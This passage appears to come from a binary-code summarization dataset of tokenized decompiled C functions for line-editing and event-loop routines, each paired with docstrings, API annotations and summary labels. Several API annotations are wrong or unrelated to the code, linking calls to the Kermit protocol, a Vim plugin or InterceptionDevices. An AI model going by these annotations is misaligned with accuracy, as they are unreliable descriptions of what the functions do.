            "!",
            "=",
            "257",
            "&",
            "&",
            "key",
            "!",
            "=",
            "256",
            ")",
            "last_tab_5818",
            "=",
            "0",
            ";",
            "result",
            "=",
            "key",
            "-",
            "256",
            ";",
            "if",
            "(",
            "key",
            "-",
            "256",
            "<",
            "=",
            "0x3C",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "if",
            "(",
            "key",
            ">",
            "0x1F",
            "&",
            "&",
            "key",
            "<",
            "=",
            "0xFF",
            ")",
            "return",
            "insert_char",
            "(",
            "key",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `edit_read` function appears to be a part of a larger program, likely a C program, where it is used to read input from the user with edit modes enabled, possibly for a command-line interface or interactive program.",
            "The function \"return\" is used to exit from a function and return a value, such as a struct or context, back to the calling code."
        ],
        "longer_label": "The `edit_read_char` function is part of a larger program written in C, designed to read input from the user with edit modes enabled, likely for a command-line interface or interactive program, and returns the result to the calling code."
    },
    {
        "id": 55,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "clear",
            "edit",
            "history",
            ",",
            "write",
            "to",
            "a",
            "history",
            "file",
            "with",
            "a",
            "provided",
            "filter",
            "callback",
            ",",
            "delete",
            "historical",
            "entries",
            ",",
            "clear",
            "the",
            "current",
            "line",
            ",",
            "and",
            "reset",
            "terminal",
            "settings",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "unsigned",
            "int",
            "(",
            "__fastcall",
            "*",
            "a2",
            ")",
            "(",
            "__int64",
            ",",
            "__int64",
            ")",
            ")",
            "{",
            "_QWORD",
            "*",
            "v2",
            ";",
            "_QWORD",
            "*",
            "v4",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "history_write",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "dl_list_empty",
            "(",
            "&",
            "history_list",
            ")",
            "?",
            "0L",
            "L",
            ":",
            "(",
            "_QWORD",
            "*",
            ")",
            "history_list",
            ";",
            "v4",
            "=",
            "v2",
            ";",
            "if",
            "(",
            "!",
            "v2",
            ")",
            "break",
            ";",
            "dl_list_del",
            "(",
            "v2",
            ")",
            ";",
            "os_free",
            "(",
            "v4",
            ")",
            ";",
            "}",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "putchar",
            "(",
            "13",
            ")",
            ";",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "eloop_unregister_read_sock",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "return",
            "tcsetattr",
            "(",
            "0",
            ",",
            "0",
            ",",
            "&",
            "prevt",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_list_del` function is designed to remove a specific entry from a doubly linked list by adjusting the pointers of the adjacent entries to bypass the entry being deleted.",
            "This function is likely intended to clear and edit a line of output by overwriting it with empty characters, using the putchar function to achieve the desired effect.",
            "The function `unregister_read_sock` is used to deregister a socket from the event loop and close it, typically employed during the deinitialization process of various components in a software system to release associated resources.",
            "The function \"ntcset\" likely sets up character set translation options and configurations, possibly within the context of the Kermit protocol, as indicated by the surrounding code snippets referencing character set variables and translation, along with the absence of any explicit implementation of the function."
        ],
        "longer_label": "The provided code is a function `edit_deinit` that writes history, clears a doubly linked list, clears and edits a line of output, unregisters a socket from the event loop, and returns a `tcsetattr` call, likely used for deinitialization in a software system."
    },
    {
        "id": 56,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "edits",
            "and",
            "redraws",
            "a",
            "command",
            "buffer",
            "in",
            "a",
            "command",
            "line",
            "interface",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v0",
            ";",
            "const",
            "char",
            "*",
            "v1",
            ";",
            "char",
            "v3",
            ";",
            "cmdbuf",
            "[",
            "cmdbuf_len",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "ps2",
            ")",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "ps2",
            ";",
            "else",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_459C",
            ";",
            "printf",
            "(",
            "\"\\r%s>%s\"",
            ",",
            "v0",
            ",",
            "cmdbuf",
            ")",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            "!",
            "=",
            "cmdbuf_len",
            ")",
            "{",
            "v3",
            "=",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ";",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "ps2",
            ")",
            "v1",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "ps2",
            ";",
            "else",
            "v1",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_459C",
            ";",
            "printf",
            "(",
            "\"\\r%s>%s\"",
            ",",
            "v1",
            ",",
            "cmdbuf",
            ")",
            ";",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            "=",
            "v3",
            ";",
            "}",
            "return",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function named `edit_redraw` that updates and prints a command buffer with a cursor, handling PS2 inputs, and ensuring the output is flushed."
    },
    {
        "id": 57,
        "docstring_tokens": [
            "The",
            "loader",
            "function",
            "opens",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "filename",
            "parameter",
            "and",
            "loads",
            "the",
            "content",
            "into",
            "the",
            "vm",
            "structure",
            "using",
            "ch_load_champ",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_vm",
            "*",
            "vm",
            ",",
            "char",
            "*",
            "filename",
            ")",
            "{",
            "unsigned",
            "int",
            "fd",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "filename",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror_",
            "(",
            "\"open\"",
            ")",
            ";",
            "ch_load_champ",
            "(",
            "vm",
            ",",
            "fd",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The perror function is used to print an error message describing the last error encountered during a file operation, such as writing to a file, and is typically followed by exiting the program with an error code.",
            "The function `ch_load_champ` likely loads champion data or information, possibly from a file or a database, in a programming context such as a video game or a sports simulation."
        ],
        "longer_label": "The provided code defines a function `loader` which attempts to open a file specified by the `filename` parameter, prints an error message using `perror_` if the file opening fails, and then proceeds to load champion data using the `ch_load_champ` function within a context like a video game or sports simulation."
    },
    {
        "id": 58,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "edit_print_ps",
            "''",
            "prints",
            "the",
            "variable",
            "``",
            "ps2",
            "''",
            "if",
            "it",
            "is",
            "not",
            "empty",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "ps2",
            ")",
            "{",
            "if",
            "(",
            "ps2",
            ")",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "ps2",
            ";",
            "else",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_459C",
            ";",
            "printf",
            "(",
            "\"\\n%s>\"",
            ",",
            "v0",
            ")",
            ";",
            "}",
            "return",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `edit_print_ps()` which prints a prompt string stored in `ps2` or a default string if `ps2` is empty, followed by a '>' character, and then flushes the standard output stream."
    },
    {
        "id": 59,
        "docstring_tokens": [
            "The",
            "code",
            "adds",
            "a",
            "new",
            "socket",
            "to",
            "the",
            "eloop",
            "socket",
            "table",
            "with",
            "specified",
            "handler",
            "and",
            "data",
            ",",
            "reallocating",
            "memory",
            "as",
            "needed",
            "and",
            "updating",
            "related",
            "variables",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "int",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "if",
            "(",
            "a2",
            "<",
            "=",
            "eloop",
            ")",
            "v9",
            "=",
            "eloop",
            ";",
            "else",
            "v9",
            "=",
            "a2",
            ";",
            "if",
            "(",
            "!",
            "a1",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v10",
            "=",
            "os_realloc_array",
            "(",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ",",
            "*",
            "a1",
            "+",
            "1",
            ",",
            "0x20uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v10",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "32L",
            "L",
            "*",
            "*",
            "a1",
            ")",
            "=",
            "a2",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "32L",
            "L",
            "*",
            "*",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "a4",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "32L",
            "L",
            "*",
            "*",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "a5",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "32L",
            "L",
            "*",
            "(",
            "*",
            "a1",
            ")",
            "+",
            "+",
            "+",
            "24",
            ")",
            "=",
            "a3",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            "=",
            "v10",
            ";",
            "eloop",
            "=",
            "v9",
            ";",
            "+",
            "+",
            "dword_1904",
            ";",
            "a1",
            "[",
            "5",
            "]",
            "=",
            "1",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named os_realloc is used for dynamically reallocating memory for a previously allocated block, allowing the block to be resized to a new size specified by the size argument.",
            "The \"array\" function appears to initialize an integer array with values from 100 to 102, and it also seems to allocate memory for an array of InterceptionDevices and initialize some of their properties."
        ],
        "longer_label": "The provided code defines a function `eloop_sock_table_add_sock` which dynamically reallocates memory for a socket table, adding a new socket entry with specified parameters `a2`, `a3`, `a4`, and `a5`, updating internal variables, and returning success or failure indicators."
    },
    {
        "id": 60,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "and",
            "populates",
            "a",
            "set",
            "of",
            "file",
            "descriptors",
            "for",
            "reading",
            ",",
            "writing",
            ",",
            "and",
            "handling",
            "exceptions",
            "using",
            "a",
            "polling",
            "mechanism",
            ",",
            "while",
            "ensuring",
            "each",
            "file",
            "descriptor",
            "is",
            "within",
            "the",
            "specified",
            "limit",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "*",
            "a1",
            ",",
            "void",
            "*",
            "a2",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "int",
            "i",
            ";",
            "memset",
            "(",
            "a2",
            ",",
            "0",
            ",",
            "0x80uL",
            "L",
            ")",
            ";",
            "result",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "result",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "result",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "i",
            ">",
            "=",
            "(",
            "int",
            ")",
            "result",
            ")",
            "break",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ")",
            "<",
            "0",
            ")",
            "_assert_fail",
            "(",
            "\"table->table[i].sock >= 0\"",
            ",",
            "\"./edit/eloop.c\"",
            ",",
            "0x242u",
            ",",
            "\"eloop_sock_table_set_fds\"",
            ")",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ")",
            "/",
            "64",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a2",
            "+",
            "v3",
            ")",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "(",
            "(",
            "(",
            "HIDWORD",
            "(",
            "v4",
            ")",
            ">",
            ">",
            "26",
            ")",
            "+",
            "v4",
            ")",
            "&",
            "0x3F",
            ")",
            "-",
            "(",
            "HIDWORD",
            "(",
            "v4",
            ")",
            ">",
            ">",
            "26",
            ")",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"memset\" is used to set a block of memory to a particular value, often used for initializing or resetting memory to zero or a specific value."
        ],
        "longer_label": "The provided code is a function named `eloop_sock_table_set_fds` that initializes a memory block to zero, iterates through a table of sockets, sets specific bits in another memory block based on socket values, and returns a result."
    },
    {
        "id": 61,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "eloop_sock_table_dispatch",
            "`",
            "iterates",
            "through",
            "a",
            "table",
            "of",
            "sockets",
            "and",
            "calls",
            "the",
            "corresponding",
            "handler",
            "function",
            "for",
            "any",
            "sockets",
            "that",
            "are",
            "set",
            "in",
            "the",
            "provided",
            "file",
            "descriptor",
            "set",
            ",",
            "stopping",
            "if",
            "the",
            "table",
            "is",
            "marked",
            "as",
            "changed",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "a1",
            "&",
            "&",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v2",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "if",
            "(",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "8L",
            "L",
            "*",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            "/",
            "64",
            ")",
            ")",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "(",
            "(",
            "(",
            "HIDWORD",
            "(",
            "v2",
            ")",
            ">",
            ">",
            "26",
            ")",
            "+",
            "v2",
            ")",
            "&",
            "0x3F",
            ")",
            "-",
            "(",
            "HIDWORD",
            "(",
            "v2",
            ")",
            ">",
            ">",
            "26",
            ")",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "(",
            "*",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            "*",
            ")",
            "(",
            "_QWORD",
            ",",
            "_QWORD",
            ",",
            "_QWORD",
            ")",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "24",
            ")",
            ")",
            "(",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "8",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "16",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            ")",
            "break",
            ";",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function called `eloop_sock_table_dispatch` which iterates through a socket table, checks conditions based on bit manipulation, and invokes a function pointer with certain arguments if conditions are met, potentially breaking out of the loop based on a flag."
    },
    {
        "id": 62,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "eloop_sock_table_destroy",
            "`",
            "destroys",
            "a",
            "socket",
            "table",
            "by",
            "freeing",
            "its",
            "memory",
            "if",
            "the",
            "table",
            "exists",
            ",",
            "iterating",
            "through",
            "the",
            "table",
            "and",
            "printing",
            "information",
            "about",
            "each",
            "socket",
            "entry",
            "before",
            "freeing",
            "the",
            "table",
            "memory",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "&",
            "&",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "wpa_printf",
            "(",
            "3L",
            "L",
            ",",
            "\"ELOOP: remaining socket: sock=%d eloop_data=%p user_data=%p handler=%p\"",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "8",
            ")",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "16",
            ")",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "24",
            ")",
            ")",
            ";",
            "return",
            "os_free",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The wpa_printf function is used for conditional debugging and error message printing, with the option to direct the output to stdout, stderr, and/or syslog based on the priority level of the message."
        ],
        "longer_label": "The provided code defines a function to destroy a socket table, iterating over the sockets and printing debug messages about remaining sockets, while also freeing memory associated with the socket table."
    },
    {
        "id": 63,
        "docstring_tokens": [
            "This",
            "function",
            "registers",
            "a",
            "socket",
            "for",
            "reading",
            "events",
            "by",
            "calling",
            "eloop_register_sock",
            "with",
            "the",
            "specified",
            "parameters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "int",
            "*",
            "sock_table",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "0",
            ")",
            "_assert_fail",
            "(",
            "\"sock >= 0\"",
            ",",
            "\"./edit/eloop.c\"",
            ",",
            "0x2EAu",
            ",",
            "\"eloop_register_sock\"",
            ")",
            ";",
            "sock_table",
            "=",
            "(",
            "int",
            "*",
            ")",
            "eloop_get_sock_table",
            "(",
            "a2",
            ")",
            ";",
            "return",
            "eloop_sock_table_add_sock",
            "(",
            "sock_table",
            ",",
            "a1",
            ",",
            "a3",
            ",",
            "a4",
            ",",
            "a5",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"register\" function appears to be a part of a larger program, likely a virtual machine or an operating system environment, handling tasks such as memory allocation, I/O operations, and module registration.",
            "The `get_sock_xinfo` function appears to retrieve information about a socket given its inode, potentially used for socket management or analysis within a Linux environment.",
            "The function `_table_add_sock` is likely intended to add a socket to an event loop's socket table, initializing necessary structures and setting up signal handlers, error checking, and memory allocation as needed."
        ],
        "longer_label": "The code is a function for registering a socket in an event loop, including handling error checking, memory allocation, and adding the socket to the event loop's socket table."
    },
    {
        "id": 64,
        "docstring_tokens": [
            "The",
            "code",
            "registers",
            "a",
            "timeout",
            "event",
            "with",
            "a",
            "specified",
            "handler",
            ",",
            "data",
            ",",
            "and",
            "duration",
            "in",
            "seconds",
            "and",
            "microseconds",
            ",",
            "ensuring",
            "that",
            "the",
            "event",
            "will",
            "occur",
            "within",
            "a",
            "reasonable",
            "time",
            "frame",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "__int64",
            "*",
            "i",
            ";",
            "_QWORD",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "v10",
            "=",
            "(",
            "_QWORD",
            "*",
            ")",
            "os_zalloc",
            "(",
            "56L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v10",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "os_get_reltime",
            "(",
            "v10",
            "+",
            "2",
            ")",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v11",
            "=",
            "v10",
            "[",
            "2",
            "]",
            ";",
            "v10",
            "[",
            "2",
            "]",
            "=",
            "a1",
            "+",
            "v11",
            ";",
            "if",
            "(",
            "v11",
            "<",
            "=",
            "v10",
            "[",
            "2",
            "]",
            ")",
            "{",
            "for",
            "(",
            "v10",
            "[",
            "3",
            "]",
            "+",
            "=",
            "a2",
            ";",
            "(",
            "__int64",
            ")",
            "v10",
            "[",
            "3",
            "]",
            ">",
            "999999",
            ";",
            "v10",
            "[",
            "3",
            "]",
            "-",
            "=",
            "1000000L",
            "L",
            ")",
            "+",
            "+",
            "v10",
            "[",
            "2",
            "]",
            ";",
            "v10",
            "[",
            "4",
            "]",
            "=",
            "a4",
            ";",
            "v10",
            "[",
            "5",
            "]",
            "=",
            "a5",
            ";",
            "v10",
            "[",
            "6",
            "]",
            "=",
            "a3",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            "i",
            "!",
            "=",
            "&",
            "qword_1950",
            ";",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "i",
            ")",
            "{",
            "if",
            "(",
            "os_reltime_before",
            "(",
            "v10",
            "+",
            "2",
            ",",
            "i",
            "+",
            "2",
            ")",
            ")",
            "{",
            "dl_list_add",
            "(",
            "i",
            "[",
            "1",
            "]",
            ",",
            "v10",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "dl_list_add_tail",
            "(",
            "(",
            "__int64",
            ")",
            "&",
            "qword_1950",
            ",",
            "v10",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "wpa_printf",
            "(",
            "2L",
            "L",
            ",",
            "\"ELOOP: Too long timeout (secs=%u) to ever happen - ignore it\"",
            ",",
            "a1",
            ")",
            ";",
            "os_free",
            "(",
            "v10",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "os_free",
            "(",
            "v10",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_get_rel` function appears to be involved in retrieving relative addresses or offsets within a binary executable, likely for purposes such as relocation or instruction decoding in the context of dynamic binary translation or virtualization.",
            "The `_reltime` function appears to be part of a Vim plugin or extension, potentially related to relative time calculations or features within the Vim text editor, handling timing or time-related functionalities.",
            "The dl_list_add_ function is used to add a specific item to the end of a doubly linked list."
        ],
        "longer_label": "The code defines a function `eloop_register_timeout` that allocates memory for a structure, calculates timeout values, adjusts them, and adds the structure to a linked list based on relative time comparisons, with error handling for timeouts exceeding a certain limit, possibly used in a system-level programming context."
    },
    {
        "id": 65,
        "docstring_tokens": [
            "This",
            "code",
            "cancels",
            "a",
            "timeout",
            "for",
            "a",
            "specific",
            "handler",
            ",",
            "eloop_data",
            ",",
            "and",
            "user_data",
            ",",
            "removing",
            "it",
            "from",
            "the",
            "timeout",
            "list",
            "and",
            "returning",
            "the",
            "number",
            "of",
            "timeouts",
            "removed",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "unsigned",
            "int",
            "v5",
            ";",
            "__int64",
            "*",
            "v6",
            ";",
            "__int64",
            "*",
            "v7",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "v6",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "qword_1950",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "__int64",
            "*",
            "*",
            ")",
            "qword_1950",
            ";",
            "while",
            "(",
            "v6",
            "!",
            "=",
            "&",
            "qword_1950",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "v6",
            "[",
            "6",
            "]",
            "&",
            "&",
            "(",
            "a2",
            "=",
            "=",
            "v6",
            "[",
            "4",
            "]",
            "|",
            "|",
            "a2",
            "=",
            "=",
            "-",
            "1",
            ")",
            "&",
            "&",
            "(",
            "a3",
            "=",
            "=",
            "v6",
            "[",
            "5",
            "]",
            "|",
            "|",
            "a3",
            "=",
            "=",
            "-",
            "1",
            ")",
            ")",
            "{",
            "eloop_remove_timeout",
            "(",
            "v6",
            ")",
            ";",
            "+",
            "+",
            "v5",
            ";",
            "}",
            "v6",
            "=",
            "v7",
            ";",
            "v7",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "v7",
            ";",
            "}",
            "return",
            "v5",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"remove\" function seems to be used to delete or unlink a file from the system, and it may have some conditional compilation for different operating systems."
        ],
        "longer_label": "The code is a function that iterates through a list of timeouts and removes any matching timeouts based on the given parameters, returning the number of removed timeouts."
    },
    {
        "id": 66,
        "docstring_tokens": [
            "This",
            "code",
            "cancels",
            "a",
            "timeout",
            "event",
            "for",
            "a",
            "specific",
            "handler",
            ",",
            "eloop",
            "data",
            ",",
            "and",
